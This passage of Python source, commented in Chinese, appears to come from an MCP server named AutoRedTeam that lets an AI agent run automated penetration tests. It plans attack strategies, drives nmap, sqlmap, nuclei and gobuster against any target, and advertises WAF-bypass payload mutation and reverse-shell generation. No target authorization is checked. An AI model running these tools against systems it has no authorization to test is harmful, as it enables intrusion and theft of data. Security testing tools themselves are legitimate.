            md += "|------|---------|------|------|\n"
            for cve in cve_info:
                md += f"| {cve['tech']} | {cve['cve_id']} | {cve['cvss']} | {cve['summary']} |\n"

        md += "\n## 修复建议\n"
        for rec in report_data['recommendations']:
            md += f"- {rec}\n"

        md += f"\n---\n*报告生成时间: {datetime.now().isoformat()}*\n*由 AutoRedTeam v2.0 自动生成*"

        return {"success": True, "format": "markdown", "report": md, "raw_data": report_data}

    elif format == "json":
        return {"success": True, "format": "json", "report": report_data}

    elif format == "html":
        return _generate_html_report(report_data, cve_info)

    elif format == "pdf":
        return _generate_pdf_report(report_data, cve_info)

    else:
        return {"success": False, "error": f"不支持的格式: {format}，可用: markdown, json, html, pdf"}

@mcp.tool()
def smart_analyze(target: str) -> dict:
    """智能分析 - 分析目标并推荐最佳攻击策略"""
    analysis = {
        "target": target,
        "target_type": None,
        "attack_surface": [],
        "recommended_tools": [],
        "attack_priority": [],
        "estimated_difficulty": None
    }

    # 解析目标类型
    if target.startswith("http"):
        analysis["target_type"] = "web_application"
    elif re.match(r'^\d+\.\d+\.\d+\.\d+$', target):
        analysis["target_type"] = "ip_address"
    elif re.match(r'^\d+\.\d+\.\d+\.\d+/\d+$', target):
        analysis["target_type"] = "network_range"
    else:
        analysis["target_type"] = "domain"

    # 根据目标类型推荐攻击面
    if analysis["target_type"] == "web_application":
        analysis["attack_surface"] = [
            "Web应用漏洞 (SQLi, XSS, CSRF)",
            "敏感信息泄露 (.git, .env, backup)",
            "目录遍历和文件包含",
            "认证和会话管理",
            "API安全"
        ]
        analysis["recommended_tools"] = [
            "full_recon - 完整侦察",
            "vuln_check - 漏洞检测",
            "sqli_detect - SQL注入检测",
            "xss_detect - XSS检测",
            "dir_bruteforce - 目录扫描",
            "sensitive_scan - 敏感文件扫描"
        ]
        analysis["attack_priority"] = [
            "1. 信息收集: 技术栈识别、目录扫描",
            "2. 漏洞扫描: SQL注入、XSS、敏感文件",
            "3. 漏洞利用: 根据发现的漏洞进行利用",
            "4. 权限提升: 获取更高权限",
            "5. 数据获取: 提取敏感数据"
        ]
        analysis["estimated_difficulty"] = "MEDIUM"

    elif analysis["target_type"] in ["ip_address", "domain"]:
        analysis["attack_surface"] = [
            "开放端口和服务",
            "Web服务 (如果存在)",
            "网络服务漏洞",
            "弱口令"
        ]
        analysis["recommended_tools"] = [
            "port_scan - 端口扫描",
            "dns_lookup - DNS查询",
            "subdomain_bruteforce - 子域名枚举",
            "http_probe - HTTP探测"
        ]
        analysis["attack_priority"] = [
            "1. 端口扫描: 发现开放服务",
            "2. 服务识别: 确定服务版本",
            "3. 漏洞匹配: 查找已知漏洞",
            "4. 漏洞利用: 尝试利用"
        ]
        analysis["estimated_difficulty"] = "MEDIUM-HIGH"

    # 快速探测获取更多信息
    try:
        if analysis["target_type"] == "web_application":
            tech = tech_detect(target)
            if tech.get("success"):
                tech_info = tech.get("technology", {})
                if tech_info.get("cms"):
                    analysis["detected_cms"] = tech_info["cms"]
                    for cms in tech_info["cms"]:
                        if cms == "WordPress":
                            analysis["attack_priority"].insert(0, "0. WordPress专项: wp-admin爆破, 插件漏洞, xmlrpc攻击")
                        elif cms == "ThinkPHP":
                            analysis["attack_priority"].insert(0, "0. ThinkPHP专项: RCE漏洞检测 (5.0.x/5.1.x)")
                if tech_info.get("cdn"):
                    analysis["has_cdn"] = True
                    analysis["notes"] = ["检测到CDN，可能需要绕过或寻找真实IP"]
    except Exception:
        pass

    return {"success": True, "analysis": analysis}

# ========== 需要外部工具的功能 (检查可用性) ==========

@mcp.tool()
def nmap_scan(target: str, ports: str = "1-1000", scan_type: str = "quick") -> dict:
    """Nmap端口扫描 - 需要安装nmap"""
    if HAS_NMAP:
        try:
            nm = nmap.PortScanner()
            args = "-sV" if scan_type == "version" else "-sT"
            nm.scan(target, ports, arguments=args)
            return {"success": True, "data": nm[target] if target in nm.all_hosts() else {}}
        except Exception as e:
            return {"success": False, "error": str(e)}

    if not check_tool("nmap"):
        return {"success": False, "error": "nmap未安装。Windows用户请从 https://nmap.org/download.html 下载安装，或使用 port_scan 工具作为替代。"}

    scan_args = {
        "quick": ["-sT", "-T4"],
        "full": ["-sT", "-sV", "-T4"],
        "stealth": ["-sS", "-T2"],
        "version": ["-sV"]
    }
    cmd = ["nmap"] + scan_args.get(scan_type, ["-sT"]) + ["-p", ports, target]
    return run_cmd(cmd, 300)

@mcp.tool()
def nuclei_scan(target: str, severity: str = None) -> dict:
    """Nuclei漏洞扫描 - 需要安装nuclei"""
    if not check_tool("nuclei"):
        return {"success": False, "error": "nuclei未安装。请从 https://github.com/projectdiscovery/nuclei 下载安装。"}

    cmd = ["nuclei", "-u", target, "-silent"]
    if severity:
        cmd.extend(["-severity", severity])
    return run_cmd(cmd, 600)

@mcp.tool()
def sqlmap_scan(url: str, level: int = 1, risk: int = 1) -> dict:
    """SQLMap扫描 - 需要安装sqlmap"""
    if not check_tool("sqlmap"):
        return {"success": False, "error": "sqlmap未安装。请从 https://sqlmap.org 下载安装。"}

    cmd = ["sqlmap", "-u", url, "--batch", "--level", str(level), "--risk", str(risk)]
    return run_cmd(cmd, 300)

@mcp.tool()
def gobuster_scan(url: str, wordlist: str) -> dict:
    """Gobuster目录扫描 - 需要安装gobuster"""
    if not check_tool("gobuster"):
        return {"success": False, "error": "gobuster未安装。请从 https://github.com/OJ/gobuster 下载安装。"}

    cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-q"]
    return run_cmd(cmd, 300)

@mcp.tool()
def subfinder_enum(domain: str) -> dict:
    """子域名枚举 - 需要安装subfinder"""
    if not check_tool("subfinder"):
        return {"success": False, "error": "subfinder未安装。请从 https://github.com/projectdiscovery/subfinder 下载安装。"}

    cmd = ["subfinder", "-d", domain, "-silent"]
    return run_cmd(cmd, 300)

# ========== 工具检查 ==========

@mcp.tool()
def check_tools() -> dict:
    """检查所有安全工具可用性"""
    tools = {
        "nmap": "端口扫描",
        "nuclei": "漏洞扫描",
        "sqlmap": "SQL注入",
        "gobuster": "目录扫描",
        "subfinder": "子域名枚举",
        "httpx": "HTTP探测",
        "whatweb": "技术栈识别",
        "wafw00f": "WAF检测",
        "nikto": "Web漏洞扫描",
        "hydra": "密码爆破",
        "whois": "域名查询"
    }

    result = {}
    for tool, desc in tools.items():
        available = check_tool(tool)
        result[tool] = {"available": available, "description": desc}

    # Python 库检查
    result["python_requests"] = {"available": HAS_REQUESTS, "description": "HTTP请求库"}
    result["python_dns"] = {"available": HAS_DNS, "description": "DNS解析库"}
    result["python_nmap"] = {"available": HAS_NMAP, "description": "Nmap Python绑定"}

    return {"success": True, "platform": platform.system(), "tools": result}

@mcp.tool()
def help_info() -> dict:
    """显示帮助信息和可用工具列表"""
    return {
        "success": True,
        "message": "AutoRedTeam - 全自动红队渗透测试智能体 v2.0",
        "platform": platform.system(),
        "usage": "只需提供目标地址，即可执行完整渗透测试并生成报告",
        "quick_start": [
            "auto_pentest('example.com') - 🔥 全自动渗透测试(深度扫描)",
            "auto_pentest('example.com', deep_scan=False) - ⚡ 快速扫描",
            "generate_report('example.com') - 📊 生成渗透测试报告",
            "smart_analyze('https://target.com') - 🧠 智能分析目标"
        ],
        "core_tools": [
            "auto_pentest - 全自动渗透测试 (推荐)",
            "generate_report - 生成专业渗透测试报告 (含CVE)",
            "smart_analyze - 智能分析目标并推荐攻击策略",
            "smart_exploit_suggest - 智能漏洞利用建议 [NEW]",
            "attack_chain_plan - 自动化攻击链规划 [NEW]",
            "poc_generator - PoC模板生成 [NEW]"
        ],
        "recon_tools": [
            "full_recon - 完整侦察",
            "port_scan - 端口扫描",
            "dns_lookup - DNS查询",
            "http_probe - HTTP探测",
            "ssl_info - SSL证书信息",
            "whois_query - Whois查询",
            "tech_detect - 技术栈识别",
            "subdomain_bruteforce - 子域名枚举",
            "dir_bruteforce - 目录扫描",
            "sensitive_scan - 敏感文件探测"
        ],
        "vuln_tools": [
            "vuln_check - 基础漏洞检测",
            "sqli_detect - SQL注入检测",
            "xss_detect - XSS检测",
            "csrf_detect - CSRF检测 [NEW]",
            "ssrf_detect - SSRF检测 [NEW]",
            "cmd_inject_detect - 命令注入检测 [NEW]",
            "xxe_detect - XXE检测 [NEW]",
            "idor_detect - IDOR越权检测 [NEW]",
            "auth_bypass_detect - 认证绕过检测 [NEW]",
            "file_upload_detect - 文件上传漏洞检测 [NEW]",
            "logic_vuln_check - 逻辑漏洞检测 [NEW]"
        ],
        "cve_tools": [
            "cve_search - CVE实时搜索 (NVD/GitHub/CIRCL多源)",
            "cve_detail - CVE详细信息查询",
            "cve_recent - 获取最近发布的CVE漏洞"
        ],
        "payload_tools": [
            "sqli_payloads - SQL注入Payload",
            "xss_payloads - XSS Payload",
            "reverse_shell_gen - 反向Shell生成",
            "google_dorks - Google Dork生成"
        ],
        "task_queue_tools": [
            "task_submit - 提交后台任务 (异步执行)",
            "task_status - 查询任务状态",
            "task_cancel - 取消等待中的任务",
            "task_list - 列出所有任务"
        ],
        "report_formats": [
            "markdown - Markdown格式报告",
            "json - JSON格式报告",
            "html - HTML网页报告 [NEW]",
            "pdf - PDF专业报告 (支持中文) [NEW]"
        ],
        "coverage": {
            "OWASP_Top10": [
                "✅ A01 - Broken Access Control (IDOR, Auth Bypass)",
                "✅ A02 - Cryptographic Failures (SSL检测)",
                "✅ A03 - Injection (SQLi, XSS, CMDi, XXE)",
                "✅ A04 - Insecure Design (逻辑漏洞检测)",
                "✅ A05 - Security Misconfiguration (敏感文件, 安全头)",
                "✅ A06 - Vulnerable Components (CVE搜索)",
                "✅ A07 - Auth Failures (认证绕过)",
                "✅ A08 - Software Integrity (文件上传)",
                "✅ A09 - Logging Failures (信息泄露)",
                "✅ A10 - SSRF (SSRF检测)"
            ]
        },
        "tip": "所有工具均为纯Python实现，无需安装任何外部工具，Windows/Linux通用"
    }

# ========== 任务队列工具 ==========

@mcp.tool()
def task_submit(tool_name: str, target: str, **kwargs) -> dict:
    """提交后台任务 - 异步执行耗时扫描

    Args:
        tool_name: 要执行的工具名称 (如 auto_pentest, full_recon, port_scan)
        target: 目标URL或IP
        **kwargs: 工具的其他参数

    Returns:
        task_id: 任务ID，用于查询状态
    """
    from utils.task_queue import get_task_queue

    # 获取工具函数
    tool_map = {
        "auto_pentest": auto_pentest,
        "full_recon": full_recon,
        "port_scan": port_scan,
        "subdomain_bruteforce": subdomain_bruteforce,
        "dir_bruteforce": dir_bruteforce,
        "sensitive_scan": sensitive_scan,
        "vuln_check": vuln_check,
        "sqli_detect": sqli_detect,
        "xss_detect": xss_detect,
        "generate_report": generate_report,
    }

    if tool_name not in tool_map:
        return {"success": False, "error": f"不支持的工具: {tool_name}", "available": list(tool_map.keys())}

    tq = get_task_queue()
    task_id = tq.submit(tool_map[tool_name], target, **kwargs)

    return {
        "success": True,
        "task_id": task_id,
        "tool": tool_name,
        "target": target,
        "message": f"任务已提交，使用 task_status('{task_id}') 查询状态"
    }

@mcp.tool()
def task_status(task_id: str) -> dict:
    """查询任务状态

    Args:
        task_id: 任务ID

    Returns:
        任务状态和结果
    """
    from utils.task_queue import get_task_queue
    return get_task_queue().get_status(task_id)

@mcp.tool()
def task_cancel(task_id: str) -> dict:
    """取消任务 (仅限等待中的任务)

    Args:
        task_id: 任务ID

    Returns:
        操作结果
    """
    from utils.task_queue import get_task_queue
    return get_task_queue().cancel(task_id)

@mcp.tool()
def task_list(limit: int = 20) -> dict:
    """列出所有任务

    Args:
        limit: 返回数量限制 (默认20)

    Returns:
        任务列表和统计信息
    """
    from utils.task_queue import get_task_queue
    return get_task_queue().list_tasks(limit)


# ========== Phase 2: 渗透测试增强工具 ==========

@mcp.tool()
def oob_detect(url: str, param: str, vuln_type: str = "ssrf", timeout: int = 30) -> dict:
    """OOB带外检测 - 检测盲SSRF/XXE/SQLi等漏洞

    Args:
        url: 目标URL
        param: 测试参数
        vuln_type: 漏洞类型 (ssrf/xxe/sqli/rce)
        timeout: 等待回调超时(秒)

    Returns:
        OOB检测结果
    """
    from modules.oob_detector import quick_oob_test
    return quick_oob_test(url, param, vuln_type, timeout)


@mcp.tool()
def session_create(name: str = None) -> dict:
    """创建HTTP会话 - 用于登录态测试

    Args:
        name: 会话名称 (可选)

    Returns:
        会话ID和信息
    """
    from core.session_manager import get_http_session_manager
    mgr = get_http_session_manager()
    session_id = mgr.create_session(name)
    return {
        "success": True,
        "session_id": session_id,
        "message": f"HTTP会话已创建: {session_id}"
    }


@mcp.tool()
def session_login(session_id: str, login_url: str, username: str, password: str,
                  username_field: str = "username", password_field: str = "password") -> dict:
    """会话登录 - 执行登录获取认证态

    Args:
        session_id: 会话ID
        login_url: 登录URL
        username: 用户名
        password: 密码
        username_field: 用户名字段名 (默认username)
        password_field: 密码字段名 (默认password)

    Returns:
        登录结果
    """
    from core.session_manager import get_http_session_manager
    mgr = get_http_session_manager()
    return mgr.login(session_id, login_url, username, password, username_field, password_field)


@mcp.tool()
def session_request(session_id: str, url: str, method: str = "GET", data: str = None) -> dict:
    """会话请求 - 使用已认证会话发送请求

    Args:
        session_id: 会话ID
        url: 请求URL
        method: HTTP方法 (GET/POST)
        data: POST数据 (JSON格式)

    Returns:
        响应结果
    """
    from core.session_manager import get_http_session_manager
    import json
    mgr = get_http_session_manager()
    data_dict = json.loads(data) if data else None
    return mgr.request(session_id, url, method, data_dict)


@mcp.tool()
def session_context(session_id: str) -> dict:
    """获取会话上下文 - 查看Cookie/Token/认证状态

    Args:
        session_id: 会话ID

    Returns:
        会话上下文信息
    """
    from core.session_manager import get_http_session_manager
    return get_http_session_manager().get_context(session_id)


@mcp.tool()
def smart_payload(vuln_type: str, payload: str, waf: str = None) -> dict:
    """智能Payload变异 - WAF绕过

    Args:
        vuln_type: 漏洞类型 (sqli/xss/rce等)
        payload: 原始Payload
        waf: WAF类型 (cloudflare/aws_waf/modsecurity等，可选)

    Returns:
        变异后的Payload列表
    """
    from modules.smart_payload_engine import mutate_payload
    return mutate_payload(payload, waf)


@mcp.tool()
def verify_vuln(url: str, param: str, vuln_type: str, payload: str = "", rounds: int = 5) -> dict:
    """统计学漏洞验证 - 多轮测试降低误报

    Args:
        url: 目标URL (需包含参数，如 http://example.com/page?id=1)
        param: 测试参数名
        vuln_type: 漏洞类型 (sqli/xss/lfi/rce/ssrf)
        payload: 测试Payload (XSS/LFI需要)
        rounds: 验证轮数 (默认5轮)

    Returns:
        统计验证结果，包含置信度和建议
    """
    from modules.vuln_verifier import verify_vuln_statistically
    return verify_vuln_statistically(url, param, vuln_type, payload, rounds)


# ========== 注册优化模块工具 ==========
try:
    from modules.optimization_tools import register_optimization_tools
    registered_tools = register_optimization_tools(mcp)
    logger.info(f"优化模块工具已注册: {registered_tools}")
except ImportError as e:
    logger.warning(f"优化模块加载失败 (可选): {e}")
except Exception as e:
    logger.warning(f"优化模块注册失败: {e}")


# ========== 注册Red Team高级工具 ==========
try:
    from modules.redteam_tools import register_redteam_tools
    redteam_tools = register_redteam_tools(mcp)
    logger.info(f"Red Team工具已注册: {redteam_tools}")
except ImportError as e:
    logger.warning(f"Red Team模块加载失败 (可选): {e}")
except Exception as e:
    logger.warning(f"Red Team模块注册失败: {e}")


# ========== 注册v2.5新增工具 ==========
try:
    from modules.v25_tools import register_v25_tools
    v25_tools = register_v25_tools(mcp)
    logger.info(f"v2.5新增工具已注册: {v25_tools}")
except ImportError as e:
    logger.warning(f"v2.5模块加载失败 (可选): {e}")
except Exception as e:
    logger.warning(f"v2.5模块注册失败: {e}")


if __name__ == "__main__":
    mcp.run()
